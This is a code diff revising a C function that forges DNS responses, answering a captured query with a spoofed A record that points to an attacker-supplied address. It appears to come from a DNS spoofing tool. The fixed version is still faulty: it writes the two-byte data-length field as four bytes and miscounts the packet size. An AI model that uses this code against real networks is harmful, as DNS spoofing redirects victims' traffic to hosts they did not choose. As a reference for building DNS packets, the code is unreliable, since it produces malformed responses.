@@ -5,7 +5,7 @@
 
 int forgeDns(const dnshdr *dnsHeader, const struct in_addr *fakeAddr, unsigned char *output) {
     int size;
-    dnsquery *query = (dnsquery *)((unsigned char *)dnsHeader + sizeof(dnshdr));
+    unsigned char *query = (unsigned char *)((unsigned char *)dnsHeader + sizeof(dnshdr));
 
     ((dnshdr *)output)->id = dnsHeader->id;
     ((dnshdr *)output)->qcount = htons(1);
@@ -16,26 +16,37 @@ int forgeDns(const dnshdr *dnsHeader, const struct in_addr *fakeAddr, unsigned c
     output[2] = 0x81;
     output[3] = 0x80;
 
-    // get the total size of the query
-    for (size = 2 + 2 + 2; query->qname[size]; size++);
+    // first get the total size of the query, name + class + type
+    for (size = 0; query[size] != 0; size++) ;
+    // set the correct total size of the query
+    // 2 for type, 2 for class, 1 for null byte
+    size+= 2 + 2 + 1;
 
     // copy the query to the output
-    memcpy(output + 12, query, size);
-    size += 12;
+    memcpy(output + sizeof(dnshdr), query, size);
+
+    // set the correct total size
+    size += sizeof(dnshdr);
 
     // create the dns answer
-    memcpy(output + size, "\xc0\x0c", 2); // pointer to q name
+    // pointer to q name
+    memcpy(output + size, "\xc0\x0c", 2);
     size += 2;
-    memcpy(output + size, "\x00\x01", 2); // type
+    // type
+    memcpy(output + size, "\x00\x01", 2);
     size += 2;
-    memcpy(output + size, "\x00\x01", 2); // class
+    // class
+    memcpy(output + size, "\x00\x01", 2);
     size += 2;
-    memcpy(output + size, "\x00\x00\x00\x22", 4); // ttl
-    size += 2;
-    memcpy(output + size, "\x00\x04", 4); // rdata len
-    size += 2;
-    memcpy(output + size, &fakeAddr, 4); // rdata
-    size += 2;
+    // TTL
+    memcpy(output + size, "\x00\x00\x00\x22", 4);
+    size += 4;
+    // data length
+    memcpy(output + size, "\x00\x04", 4);
+    size += 4;
+    // data
+    memcpy(output + size, fakeAddr, 4);
+    size += 4;
 
     return size;
 }
